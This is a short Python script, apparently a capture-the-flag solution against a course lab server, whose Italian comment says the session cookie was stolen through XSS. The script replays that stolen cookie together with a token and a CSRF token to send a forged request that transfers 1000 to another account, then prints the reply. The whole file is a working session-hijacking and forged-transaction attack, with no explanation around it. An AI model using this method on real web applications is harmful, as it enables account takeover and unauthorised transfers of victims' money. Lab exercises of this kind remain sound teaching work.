import requests

# Cookie rubato con xss
cookies = {
    "session-csrf-2": "eyJ1c2VyaWQiOiIxIn0.Z92SdA.v6hTp2_zrPeKEdnoa__Y5IiUVus", 
    "token": "l3-tr4ns4z10n1-s0n0-4b1l1t4t3",
}
headers = {
    "Content-Type": "application/json",
    "X-CSRF-Token": "ImQ4NmEzMjZiZGMzNjZjY2Q4NTRjMzdjOGM2MjFiZmE3NDJhZGU5MDQi.Z9VxXA.B04TKb3VAXaIGAnTsqWjhxgs4q0",
    "X-requested-with": "XMLHttpRequest",
}
url = "http://ctf.unife.it:13085/effettua-transazione?toconto=4&amount=1000&token=l3-tr4ns4z10n1-s0n0-4b1l1t4t3"

response = requests.get(url, headers=headers, cookies=cookies); 

print(response.status_code)
print(response.text)
